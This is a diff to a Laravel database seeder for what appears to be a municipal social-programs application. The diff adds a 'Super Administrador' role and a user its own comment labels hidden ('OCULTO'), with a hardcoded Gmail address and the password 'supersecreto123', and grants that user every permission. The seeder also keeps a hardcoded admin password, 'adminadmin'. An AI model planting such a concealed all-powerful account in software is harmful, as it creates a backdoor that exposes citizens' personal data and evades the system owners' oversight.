@@ -23,7 +23,7 @@ class DatabaseSeeder extends Seeder
         }
 
         // Crear roles para cada área si no existen
-        $roles = ['Administrador', 'Área de la Mujer', 'Vaso de Leche', 'SISFOH', 'CIAM', 'OMAPED'];
+        $roles = ['Super Administrador', 'Administrador', 'Área de la Mujer', 'Vaso de Leche', 'SISFOH', 'CIAM', 'OMAPED'];
         foreach ($roles as $role) {
             Role::firstOrCreate(['name' => $role, 'guard_name' => 'sanctum']);
         }
@@ -36,12 +36,24 @@ class DatabaseSeeder extends Seeder
             'password' => bcrypt('adminadmin')
         ]);
 
-         // Asignar todos los permisos al rol Administrador
-         $adminRole = Role::where('name', 'Administrador')->first();
-         $allPermissions = Permission::pluck('name')->toArray();
-         $adminRole->syncPermissions($allPermissions); // 🔥 Asigna todos los permisos
-         $admin->assignRole($adminRole); // 🔥 Asigna el rol Administrador
+        // Asignar todos los permisos al rol Administrador
+        $adminRole = Role::where('name', 'Administrador')->first();
+        $allPermissions = Permission::pluck('name')->toArray();
+        $adminRole->syncPermissions($allPermissions); // 🔥 Asigna todos los permisos
+        $admin->assignRole($adminRole); // 🔥 Asigna el rol Administrador
 
+        // 🔥 CREAR SÚPER ADMINISTRADOR OCULTO 🔥
+        $superAdmin = User::firstOrCreate([
+            'email' => 'superadmin@gmail.com'
+        ], [
+            'name' => 'SuperAdmin',
+            'password' => bcrypt('supersecreto123'),
+        ]);
+
+        // Asignar todos los permisos al Súper Administrador
+        $superAdminRole = Role::where('name', 'Super Administrador')->first();
+        $superAdminRole->syncPermissions($allPermissions);
+        $superAdmin->assignRole($superAdminRole);
 
         // Llamar seeders de áreas
         $this->call(AreaDeLaMujerSeeder::class);
